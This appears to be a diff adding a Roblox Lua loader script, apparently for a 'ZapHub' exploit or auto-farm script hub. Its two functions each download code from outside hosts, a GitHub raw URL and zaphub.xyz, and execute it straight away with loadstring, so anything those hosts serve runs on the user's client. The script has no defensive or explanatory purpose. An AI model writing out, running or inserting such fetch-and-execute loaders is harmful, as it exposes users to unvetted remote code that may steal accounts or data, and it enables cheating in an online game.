@@ -1,0 +1,9 @@
+local function ID()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScriptsGAG/ZapHub/refs/heads/main/Exec"))()
+end
+local function Farm()
+    loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+end
+
+task.spawn(ID)
+task.spawn(Farm)
